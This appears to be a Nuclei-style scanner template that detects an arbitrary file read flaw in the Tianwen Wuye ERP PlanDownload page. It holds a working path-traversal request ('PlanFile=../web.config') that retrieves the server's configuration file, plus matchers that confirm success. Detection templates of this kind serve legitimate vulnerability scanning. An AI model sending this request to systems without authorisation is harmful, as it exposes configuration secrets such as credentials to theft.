id: poc-tianwen-wuye-erp-plandownload-anyfile-read
info:
  name: Tianwen Wuye ERP PlanDownload Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read,erp
  description: |
    Tianwen Wuye ERP system contains an arbitrary file read vulnerability in the PlanDownload feature.

http:
  - method: GET
    path:
      - "{{BaseURL}}/HM/M_main/InformationManage/PlanDownLoad.aspx?PlanFile=../web.config"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "filename=web.config"
      - type: word
        part: header
        words:
          - "application/octet-stream"
      - type: word
        part: body
        words:
          - "<configuration>"
